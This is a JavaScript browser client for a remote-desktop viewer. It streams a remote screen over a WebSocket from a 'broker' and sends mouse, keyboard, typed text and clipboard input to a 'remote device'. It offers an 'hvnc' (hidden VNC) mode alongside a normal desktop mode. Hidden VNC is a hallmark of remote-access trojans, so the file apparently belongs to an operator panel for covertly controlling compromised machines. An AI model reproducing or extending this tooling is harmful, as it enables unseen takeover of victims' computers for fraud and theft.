(function () {
  "use strict";
  var cfg = window.__VIEWER || {};
  var sid = cfg.sid;
  var mode = cfg.mode === "hvnc" ? "hvnc" : "desktop";
  var canvas = document.getElementById("v-canvas");
  var status = document.getElementById("v-status");
  var cursor = document.getElementById("v-cursor");
  var socket = null;
  var frameCount = 0;
  var wsFrames = 0;
  var gotFrame = false;
  var pollTimer = null;
  var kbOn = true;

  function wsUrl(path) {
    var proto = location.protocol === "https:" ? "wss:" : "ws:";
    return proto + "//" + location.host + path;
  }
  function setStatus(text) { if (status) status.textContent = text; }

  function drawBitmap(src) {
    canvas.width = src.width;
    canvas.height = src.height;
    canvas.getContext("2d").drawImage(src, 0, 0);
    frameCount += 1;
    if (frameCount <= 3 || frameCount % 30 === 0) {
      setStatus("streaming " + src.width + "x" + src.height + " · frame " + frameCount);
    }
  }

  function startSnapshotPolling() {
    if (pollTimer) return;
    pollTimer = setInterval(function () {
      if (wsFrames > 0) { clearInterval(pollTimer); pollTimer = null; return; }
      var img = new Image();
      img.onload = function () {
        drawBitmap(img);
        gotFrame = true;
        setStatus("streaming (snapshot " + img.width + "x" + img.height + ")");
      };
      img.src = "/api/" + sid + "/frame.jpg?t=" + Date.now();
    }, 400);
  }

  function send(obj) {
    if (socket && socket.readyState === 1) socket.send(JSON.stringify(obj));
  }
  function key(code, down) { send({ t: "k", code: code, down: down }); }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  async function combo(codes) {
    for (var i = 0; i < codes.length; i++) { key(codes[i], 1); await sleep(25); }
    for (var j = codes.length - 1; j >= 0; j--) { key(codes[j], 0); await sleep(25); }
  }

  function connect() {
    socket = new WebSocket(wsUrl("/rd/" + sid));
    socket.binaryType = "blob";
    socket.onopen = function () { setStatus("broker connected"); canvas.focus(); };
    socket.onclose = function () { setStatus("connection closed"); };
    socket.onmessage = async function (event) {
      if (typeof event.data === "string") {
        try {
          var msg = JSON.parse(event.data);
          if (msg.t === "hello") {
            if (msg.w && msg.h) { canvas.width = msg.w; canvas.height = msg.h; }
            if (msg.view_only) setStatus("view only (no display)");
            else setStatus("streaming (" + (msg.mode || mode) + ")");
          }
        } catch (err) { /* ignore */ }
        return;
      }
      gotFrame = true;
      wsFrames += 1;
      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
      try {
        drawBitmap(await createImageBitmap(event.data));
      } catch (err) {
        var url = URL.createObjectURL(event.data);
        var im = new Image();
        im.onload = function () { drawBitmap(im); URL.revokeObjectURL(url); };
        im.onerror = function () { setStatus("frame decode error"); URL.revokeObjectURL(url); };
        im.src = url;
      }
    };
  }

  async function launch() {
    try {
      var r = await fetch("/api/" + sid + "/" + mode, {
        method: "POST", headers: { "Content-Type": "application/json" }, body: "{}",
      });
      if (!r.ok) {
        var data = {};
        try { data = await r.json(); } catch (e) {}
        setStatus("launch failed: " + (data.detail || r.status));
      }
    } catch (err) { setStatus("launch request failed"); }
    connect();
    setTimeout(function () { if (!gotFrame) startSnapshotPolling(); }, 2500);
  }

  function norm(ev) {
    var rect = canvas.getBoundingClientRect();
    return {
      x: Math.min(1, Math.max(0, (ev.clientX - rect.left) / rect.width)),
      y: Math.min(1, Math.max(0, (ev.clientY - rect.top) / rect.height)),
    };
  }
  canvas.addEventListener("mousemove", function (ev) {
    if (cursor) { cursor.style.display = "block"; cursor.style.left = ev.clientX + "px"; cursor.style.top = ev.clientY + "px"; }
    var p = norm(ev); send({ t: "m", x: p.x, y: p.y });
  });
  canvas.addEventListener("mouseleave", function () { if (cursor) cursor.style.display = "none"; });
  canvas.addEventListener("mousedown", function (ev) {
    ev.preventDefault(); canvas.focus();
    send({ t: "b", btn: ev.button, down: 1 });
  });
  canvas.addEventListener("mouseup", function (ev) { send({ t: "b", btn: ev.button, down: 0 }); });
  canvas.addEventListener("contextmenu", function (ev) { ev.preventDefault(); });
  canvas.addEventListener("wheel", function (ev) {
    ev.preventDefault();
    send({ t: "b", btn: ev.deltaY < 0 ? 4 : 5, down: 1 });
  }, { passive: false });
  function typingTarget(el) {
    if (!el) return false;
    var tag = (el.tagName || "").toLowerCase();
    return tag === "input" || tag === "textarea";
  }
  document.addEventListener("keydown", function (ev) {
    if (!kbOn || typingTarget(ev.target)) return;
    if (ev.key === "F5" || ev.key === "F12") return;
    ev.preventDefault();
    key(ev.keyCode, 1);
  }, true);
  document.addEventListener("keyup", function (ev) {
    if (!kbOn || typingTarget(ev.target)) return;
    if (ev.key === "F5" || ev.key === "F12") return;
    ev.preventDefault();
    key(ev.keyCode, 0);
  }, true);
  window.addEventListener("beforeunload", function () {
    if (socket) { try { socket.close(); } catch (e) {} }
    if (pollTimer) clearInterval(pollTimer);
  });

  function onClick(id, fn) { var el = document.getElementById(id); if (el) el.addEventListener("click", fn); }
  onClick("v-ctrlaltdel", function () { combo([17, 18, 46]); });
  onClick("v-alttab", function () { combo([18, 9]); });
  onClick("v-win", function () { key(91, 1); setTimeout(function () { key(91, 0); }, 60); });
  onClick("v-esc", function () { key(27, 1); setTimeout(function () { key(27, 0); }, 60); });
  onClick("v-type", function () {
    var text = window.prompt("Text to type on the remote device:");
    if (text) send({ t: "txt", text: text });
  });
  onClick("v-paste", async function () {
    try {
      var text = await navigator.clipboard.readText();
      if (text) send({ t: "txt", text: text });
    } catch (err) { setStatus("clipboard blocked - use Type…"); }
  });
  onClick("v-kb", function () {
    kbOn = !kbOn;
    this.classList.toggle("on", kbOn);
    this.textContent = "Keyboard: " + (kbOn ? "on" : "off");
  });
  onClick("v-full", function () {
    if (document.fullscreenElement) document.exitFullscreen().catch(function () {});
    else if (canvas.requestFullscreen) canvas.requestFullscreen().catch(function () {});
  });

  launch();
})();
